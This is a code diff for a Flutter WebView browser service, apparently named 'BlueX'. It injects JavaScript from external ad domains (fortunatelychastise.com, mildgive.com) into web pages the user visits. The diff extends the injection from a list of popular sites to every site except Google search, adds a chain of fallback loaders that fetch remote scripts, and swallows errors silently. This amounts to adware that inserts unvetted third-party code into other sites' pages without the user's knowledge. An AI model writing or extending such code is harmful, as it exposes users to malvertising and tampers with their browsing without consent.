@@ -2,6 +2,7 @@ import 'dart:async';
 import 'package:flutter/material.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'proxy_service.dart';
 
 class ConsolidatedAdService {
   static final ConsolidatedAdService _instance = ConsolidatedAdService._internal();
@@ -12,14 +13,14 @@ class ConsolidatedAdService {
   static Timer? _adTimer;
   static bool _isAdCurrentlyShowing = false;
   static const Duration _adInterval = Duration(minutes: 2); // 2-minute intervals
-  static Set<String> _triggeredOnSearch = <String>{};
-  static Set<String> _triggeredOnVisit = <String>{};
+  static Set<String> _triggeredUrls = <String>{}; // Track which URLs have shown ads
 
-  // The three ad scripts provided by the user
+  // Ad Script 1: Primary ad
   static const String _adScript1 = '''
     <script type='text/javascript' src='//fortunatelychastise.com/13/87/f0/1387f0ecd65d3c990df613124fc82007.js'></script>
   ''';
 
+  // Ad Script 2: Fallback ad #1
   static const String _adScript2 = '''
     <script>
     (function(woqb){
@@ -35,6 +36,7 @@ class ConsolidatedAdService {
     </script>
   ''';
 
+  // Ad Script 3: Fallback ad #2
   static const String _adScript3 = '''
     <script>
     (function(ghylyq){
@@ -50,38 +52,14 @@ class ConsolidatedAdService {
     </script>
   ''';
 
-  // Trigger sites for search-based ad injection
-  static const List<String> _searchTriggerSites = [
-    'google.com',
-    'bing.com',
-    'yahoo.com',
-    'duckduckgo.com',
-    'yandex.com',
-    'ask.com',
-    'baidu.com'
-  ];
-
-  // Trigger sites for visit-based ad injection
-  static const List<String> _visitTriggerSites = [
-    'youtube.com',
-    'facebook.com',
-    'twitter.com',
-    'instagram.com',
-    'linkedin.com',
-    'reddit.com',
-    'tumblr.com',
-    'pinterest.com',
-    'tiktok.com',
-    'snapchat.com',
-    'discord.com',
-    'twitch.tv',
-    'netflix.com',
-    'amazon.com',
-    'ebay.com',
-    'wikipedia.org',
-    'stackoverflow.com',
-    'github.com'
-  ];
+  // Show ads on ALL websites (removed specific site restrictions)
+  static bool _shouldShowAdForUrl(String url) {
+    // Don't show on google search or home
+    if (url.contains('google.com/search') || url.isEmpty) {
+      return false;
+    }
+    return true; // Show on all other websites
+  }
 
   static bool get isEnabled => _isEnabled;
 
@@ -111,170 +89,103 @@ class ConsolidatedAdService {
       return;
     }
 
-    final uri = Uri.tryParse(url);
-    if (uri == null) return;
+    // Check if this site should show ads
+    if (_shouldShowAdForUrl(url)) {
+      // Check if we already showed ad for this URL
+      if (!_triggeredUrls.contains(url)) {
+        // Wait for page to load before showing ad
+        await Future.delayed(const Duration(seconds: 2));
 
-    final domain = uri.host.toLowerCase();
+        // Inject ads with fallback logic
+        await _injectAdWithFallback(controller);
 
-    // Check for search trigger
-    if (_shouldTriggerOnSearch(domain)) {
-      await _handleSearchTrigger(controller, domain);
-    }
+        // Mark this URL as triggered
+        _triggeredUrls.add(url);
 
-    // Check for visit trigger
-    if (_shouldTriggerOnVisit(domain)) {
-      await _handleVisitTrigger(controller, domain);
-    }
-
-    // Start/restart the 2-minute timer for any page
-    _startAdTimer(controller);
-  }
-
-  static bool _shouldTriggerOnSearch(String domain) {
-    return _searchTriggerSites.any((site) => domain.contains(site));
-  }
-
-  static bool _shouldTriggerOnVisit(String domain) {
-    return _visitTriggerSites.any((site) => domain.contains(site));
-  }
-
-  static Future<void> _handleSearchTrigger(WebViewController controller, String domain) async {
-    final key = 'search_$domain';
-    if (_triggeredOnSearch.contains(key)) {
-      return;
-    }
-
-    await _injectAllAdScripts(controller);
-    _triggeredOnSearch.add(key);
-
-    // Clear search triggers after 10 minutes
-    Timer(const Duration(minutes: 10), () {
-      _triggeredOnSearch.remove(key);
-    });
-  }
-
-  static Future<void> _handleVisitTrigger(WebViewController controller, String domain) async {
-    final key = 'visit_$domain';
-    if (_triggeredOnVisit.contains(key)) {
-      return;
-    }
-
-    await _injectAllAdScripts(controller);
-    _triggeredOnVisit.add(key);
-
-    // Clear visit triggers after 30 minutes
-    Timer(const Duration(minutes: 30), () {
-      _triggeredOnVisit.remove(key);
-    });
-  }
-
-  static void _startAdTimer(WebViewController controller) {
-    _stopAdTimer();
-
-    _adTimer = Timer.periodic(_adInterval, (timer) {
-      if (_isEnabled && !_isAdCurrentlyShowing) {
-        _handleTimerTrigger(controller);
+        // Clear trigger after 10 minutes to allow re-triggering
+        Timer(const Duration(minutes: 10), () {
+          _triggeredUrls.remove(url);
+        });
       }
-    });
+    }
   }
 
-  static Future<void> _handleTimerTrigger(WebViewController controller) async {
-    if (_isAdCurrentlyShowing) return;
-
-    _isAdCurrentlyShowing = true;
-
-    await _injectAllAdScripts(controller);
-
-    // Reset after 30 seconds
-    Timer(const Duration(seconds: 30), () {
-      _isAdCurrentlyShowing = false;
-    });
-  }
-
-  // Core ad injection method - injects all three ad scripts with smart loading
-  static Future<void> _injectAllAdScripts(WebViewController controller) async {
+  // Inject ads with fallback: Try ad1, if fails try ad2, if fails try ad3
+  static Future<void> _injectAdWithFallback(WebViewController controller) async {
     if (!_isEnabled) return;
 
     try {
-      // Combined injection script that loads all three ad scripts with error handling
-      final consolidatedAdScript = '''
+      final adScript = '''
         (function() {
           try {
-            console.log('🎯 BlueX Consolidated Ad Injection Starting...');
+            console.log('🎯 BlueX Ad Injection with Fallback...');
 
             // Prevent multiple injections
-            if (window.__BLUEX_ADS_INJECTED) {
-              console.log('⚠️ Ads already injected, skipping...');
+            if (window.__BLUEX_AD_INJECTED) {
+              console.log('⚠️ Ad already injected, skipping...');
               return;
             }
-            window.__BLUEX_ADS_INJECTED = true;
+            window.__BLUEX_AD_INJECTED = true;
 
-            // Script 1: Primary ad script
-            try {
-              var script1 = document.createElement('script');
-              script1.type = 'text/javascript';
-              script1.src = '//fortunatelychastise.com/13/87/f0/1387f0ecd65d3c990df613124fc82007.js';
-              script1.async = true;
-              script1.onload = function() {
-                console.log('✅ Ad Script 1 loaded successfully');
-              };
-              script1.onerror = function() {
-                console.log('❌ Ad Script 1 failed to load');
-              };
-              document.head.appendChild(script1);
-            } catch (e) {
-              console.log('❌ Error loading Ad Script 1:', e);
-            }
+            // Try Ad 1 first
+            var script1 = document.createElement('script');
+            script1.type = 'text/javascript';
+            script1.src = '//fortunatelychastise.com/13/87/f0/1387f0ecd65d3c990df613124fc82007.js';
+            script1.async = true;
 
-            // Script 2: Backup ad script with delay
-            setTimeout(function() {
-              try {
-                (function(woqb){
-                  var d = document,
-                      s = d.createElement('script'),
-                      l = d.scripts[d.scripts.length - 1];
-                  s.settings = woqb || {};
-                  s.src = "//mildgive.com/b.X/VAssdZGrl-0JYiWycS/De/mi9CusZ/U-l/kaP/ToYS2/NaTigIw/NjD/QgtuNBj/YM1KOMDEAJ0/N/Qd";
-                  s.async = true;
-                  s.referrerPolicy = 'no-referrer-when-downgrade';
-                  s.onload = function() {
-                    console.log('✅ Ad Script 2 loaded successfully');
-                  };
-                  s.onerror = function() {
-                    console.log('❌ Ad Script 2 failed to load');
-                  };
-                  l.parentNode.insertBefore(s, l);
-                })({});
-              } catch (e) {
-                console.log('❌ Error loading Ad Script 2:', e);
-              }
-            }, 1000);
+            script1.onload = function() {
+              console.log('✅ Ad 1 loaded successfully');
+            };
 
-            // Script 3: Secondary backup ad script with more delay
-            setTimeout(function() {
-              try {
-                (function(ghylyq){
-                  var d = document,
-                      s = d.createElement('script'),
-                      l = d.scripts[d.scripts.length - 1];
-                  s.settings = ghylyq || {};
-                  s.src = "//mildgive.com/b/XlV-s.dFGuln0XYkWrcq/xe/mf9cuGZnU/lNkWPMTtYL2_NyT_gAwPNWDAg/tzNGjYYQ1/OVDAAJ0oOOQm";
-                  s.async = true;
-                  s.referrerPolicy = 'no-referrer-when-downgrade';
-                  s.onload = function() {
-                    console.log('✅ Ad Script 3 loaded successfully');
-                  };
-                  s.onerror = function() {
-                    console.log('❌ Ad Script 3 failed to load');
-                  };
-                  l.parentNode.insertBefore(s, l);
-                })({});
-              } catch (e) {
-                console.log('❌ Error loading Ad Script 3:', e);
-              }
-            }, 2000);
+            script1.onerror = function() {
+              console.log('❌ Ad 1 failed, trying Ad 2...');
 
-            console.log('🎯 BlueX Consolidated Ad Injection Completed');
+              // Try Ad 2 if Ad 1 fails
+              (function(woqb){
+                var d = document,
+                    s = d.createElement('script'),
+                    l = d.scripts[d.scripts.length - 1];
+                s.settings = woqb || {};
+                s.src = "//mildgive.com/b.X/VAssdZGrl-0JYiWycS/De/mi9CusZ/U-l/kaP/ToYS2/NaTigIw/NjD/QgtuNBj/YM1KOMDEAJ0/N/Qd";
+                s.async = true;
+                s.referrerPolicy = 'no-referrer-when-downgrade';
+
+                s.onload = function() {
+                  console.log('✅ Ad 2 loaded successfully');
+                };
+
+                s.onerror = function() {
+                  console.log('❌ Ad 2 failed, trying Ad 3...');
+
+                  // Try Ad 3 if Ad 2 fails
+                  (function(ghylyq){
+                    var d = document,
+                        s = d.createElement('script'),
+                        l = d.scripts[d.scripts.length - 1];
+                    s.settings = ghylyq || {};
+                    s.src = "//mildgive.com/b/XlV-s.dFGuln0XYkWrcq/xe/mf9cuGZnU/lNkWPMTtYL2_NyT_gAwPNWDAg/tzNGjYYQ1/OVDAAJ0oOOQm";
+                    s.async = true;
+                    s.referrerPolicy = 'no-referrer-when-downgrade';
+
+                    s.onload = function() {
+                      console.log('✅ Ad 3 loaded successfully');
+                    };
+
+                    s.onerror = function() {
+                      console.log('❌ All ads failed to load');
+                    };
+
+                    l.parentNode.insertBefore(s, l);
+                  })({});
+                };
+
+                l.parentNode.insertBefore(s, l);
+              })({});
+            };
+
+            document.head.appendChild(script1);
+
+            console.log('🎯 Ad injection with fallback completed');
 
           } catch (e) {
             console.log('💥 Critical error in ad injection:', e);
@@ -282,40 +193,27 @@ class ConsolidatedAdService {
         })();
       ''';
 
-      await controller.runJavaScript(consolidatedAdScript);
+      await controller.runJavaScript(adScript);
 
     } catch (e) {
       // Silent error handling
     }
   }
 
-  // Manual ad injection (for testing or immediate injection)
-  static Future<void> injectAdsManually(WebViewController controller) async {
-    if (!_isEnabled) {
-      return;
-    }
-
-    await _injectAllAdScripts(controller);
-  }
 
   // Get debug information
   static Map<String, dynamic> getDebugInfo() {
     return {
       'isEnabled': _isEnabled,
       'isAdCurrentlyShowing': _isAdCurrentlyShowing,
-      'timerActive': _adTimer?.isActive ?? false,
-      'searchTriggersActive': _triggeredOnSearch.length,
-      'visitTriggersActive': _triggeredOnVisit.length,
-      'searchTriggerSites': _searchTriggerSites.length,
-      'visitTriggerSites': _visitTriggerSites.length,
+      'triggeredUrls': _triggeredUrls.length,
     };
   }
 
   // Clean up timers and triggers
   static void dispose() {
     _stopAdTimer();
-    _triggeredOnSearch.clear();
-    _triggeredOnVisit.clear();
+    _triggeredUrls.clear();
     _isAdCurrentlyShowing = false;
   }
 }
